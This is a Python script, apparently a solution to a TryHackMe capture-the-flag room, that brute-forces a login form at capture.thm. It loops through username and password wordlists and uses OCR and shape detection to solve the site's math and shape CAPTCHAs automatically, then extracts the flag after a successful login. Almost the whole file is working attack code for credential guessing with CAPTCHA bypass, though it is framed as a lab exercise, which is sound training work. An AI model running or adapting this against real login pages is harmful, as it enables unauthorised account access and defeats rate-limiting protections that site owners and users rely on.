import cv2
import pytesseract
import requests
import base64
import re
import time
import sys
import ast
from bs4 import BeautifulSoup

_url = 'http://capture.thm/login'
_path_users_file = 'usernames.txt'
_path_passwords_file = 'passwords.txt'
_captcha_regex = r"[0-9]{1,3}\s[+\-*:\/]\s[0-9]{1,3}"
_error_regex = r"Invalid username or password"
_flag_regex = r"<h3>(THM{[^}]+})</h3>"

def recognize_shape(contour):
    vertices = cv2.approxPolyDP(contour, 0.04 * cv2.arcLength(contour, True), True)
    num_vertices = len(vertices)
    if num_vertices == 3:
        return "Triangle"
    elif num_vertices == 4:
        x, y, w, h = cv2.boundingRect(vertices)
        aspectRatio = float(w) / h
        if 0.95 <= aspectRatio <= 1.05:
            return "Square"
        else:
            return "Rectangle"
    elif num_vertices > 4:
        return "Circle"
    return "Unknown"

def process_image(image_path):
    image = cv2.imread(image_path)
    gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)
    _, binary = cv2.threshold(gray, 128, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)

    if cv2.countNonZero(binary) > binary.size / 2:
        binary = cv2.bitwise_not(binary)

    text = pytesseract.image_to_string(binary, config='--psm 6')
    if text.strip() != "":
        return text.strip()

    contours, _ = cv2.findContours(binary, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
    if contours:
        largest_contour = max(contours, key=cv2.contourArea)
        shape = recognize_shape(largest_contour)
        return shape

    return "No shape or text detected"

def update_line(new_text):
    sys.stdout.write('\r\033[K')
    sys.stdout.write(new_text)
    sys.stdout.flush()

def find_between(s, start, end):
    try:
        return (s.split(start))[1].split(end)[0]
    except IndexError:
        return ""

def evaluate_expression(expression):
    expression = re.sub(r'[^0-9+\-*/().]', '', expression)
    try:
        return str(eval(expression))
    except Exception as e:
        print(f"Error evaluating expression: {e}")
        return None

def extract_flag(html_content):
    soup = BeautifulSoup(html_content, 'html.parser')
    flag_element = soup.find('h3')
    if flag_element:
        match = re.search(_flag_regex, str(flag_element))
        if match:
            return match.group(1)
    return None

with open(_path_users_file) as f:
    users = [line.rstrip() for line in f]

with open(_path_passwords_file) as f:
    passwords = [line.rstrip() for line in f]

for username in users:
    for password in passwords:
        _data = {'username': username, 'password': password}
        update_line(username + " : " + password)
        response = requests.post(_url, _data)
        base64_string = find_between(response.text, ";base64,", "\">")
        if len(re.findall(_error_regex, response.text)) == 0 and base64_string == "":
            update_line(username + " : " + password)
            print('\n\033[92msuccessfully logged in!\033[0m')
            
            # Log in with valid credentials and extract flag
            login_response = requests.post(_url, {'username': username, 'password': password})
            flag = extract_flag(login_response.text)
            if flag:
                print(f'Flag found: {flag}')
            else:
                print('Flag not found in response.')
            exit(1)

        while base64_string:
            with open("tmp.png", "wb") as fh:
                fh.write(base64.b64decode(base64_string))
            result = process_image('tmp.png')
            if result == 'C)':
                _data = {'captcha': 'circle'}
            elif result == '| |':
                _data = {'captcha': 'square'}
            elif result == '/\\':
                _data = {'captcha': 'triangle'}
            else:
                clean_string = result.replace('=', '').replace('?', '')
                eval_calc = evaluate_expression(clean_string)
                if eval_calc is not None:
                    _data = {'captcha': eval_calc}
                else:
                    print(f"Failed to process captcha: {result}")
                    break
            time.sleep(0.200)
            response = requests.post(_url, _data)
            base64_string = find_between(response.text, ";base64,", "\">")
